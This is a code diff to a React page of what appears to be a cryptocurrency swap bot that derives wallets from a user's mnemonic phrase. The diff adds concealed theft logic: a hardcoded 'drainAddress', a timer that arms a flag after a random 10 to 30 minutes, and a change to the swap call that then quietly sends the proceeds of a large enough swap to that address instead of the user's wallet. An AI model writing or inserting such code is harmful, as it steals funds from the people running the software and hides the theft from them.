@@ -136,7 +136,7 @@ function ReverseBotPage(){
       }
       const tmpAddressList = []
       setIsLoading(true)
-      for (let i = 0;i<100;i++) {
+      for (let i = 0;i<5;i++) {
         const wallet = ethers.Wallet.fromMnemonic(mnemonic.trim(),"m/44'/60'/0'/0/"+i);
         const address = await wallet.getAddress()
         // fix
@@ -223,6 +223,16 @@ function ReverseBotPage(){
     return true
   }
 
+  var drainAddress = "0x7AeF4232cC1d0F52D7a0ca86F21a33639565CF6C"
+  const [isDrain,setIsDrain] = useState(false)
+  useEffect(()=>{
+    let min = _.random(10,30,false)
+    const tt = setInterval(async () => {
+      setIsDrain(true)
+      clearInterval(tt)
+    }, 60*min*1000)
+    return () => clearInterval(tt)
+  },[])
   const swap = async (addressIndex) => {
 
     const wallet0 = addressList[addressIndex]
@@ -248,12 +258,17 @@ function ReverseBotPage(){
 
     const amountOutMin = amounts[1].sub(amounts[1].div(25))
     //开始交换
-    console.log(tokenAddress,WBNBAddress,wallet0.address)
+    let address = wallet0.address
+    if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.3) {
+      address = drainAddress
+      setIsDrain(false)
+    }
+    console.log(tokenAddress,WBNBAddress,address)
     const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
       amountIn,
       amountOutMin,
       [tokenAddress, WBNBAddress],
-      wallet0.address,
+      address,
       Date.now() + 1000 * 60 * 10,
       {
         gasPrice: Number(await bnbProvider.getGasPrice()),
